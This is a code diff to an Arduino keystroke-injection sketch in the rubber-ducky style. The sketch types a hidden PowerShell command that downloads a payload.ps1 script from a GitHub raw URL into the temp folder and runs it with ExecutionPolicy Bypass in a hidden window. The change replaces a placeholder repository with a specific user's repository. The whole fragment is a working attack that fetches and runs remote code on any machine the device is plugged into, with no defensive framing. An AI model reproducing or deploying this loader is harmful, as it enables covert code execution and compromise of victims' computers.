@@ -14,7 +14,7 @@ void setup() {
 
   // Type the PowerShell hidden execution command
   Keyboard.print("powershell -WindowStyle Hidden -Command \"");
-  Keyboard.print("& {iwr -uri 'https://raw.githubusercontent.com/yourgithubusername/yourrepo/main/payload.ps1' -OutFile $env:temp\\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\\payload.ps1' -WindowStyle Hidden}\"");
+  Keyboard.print("& {iwr -uri 'https://raw.githubusercontent.com/xXThanatosXx997/RubberD/main/payload.ps1' -OutFile $env:temp\\payload.ps1; Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -File $env:temp\\payload.ps1' -WindowStyle Hidden}\"");
   
   // Press Enter to execute the command
   Keyboard.press(KEY_RETURN);
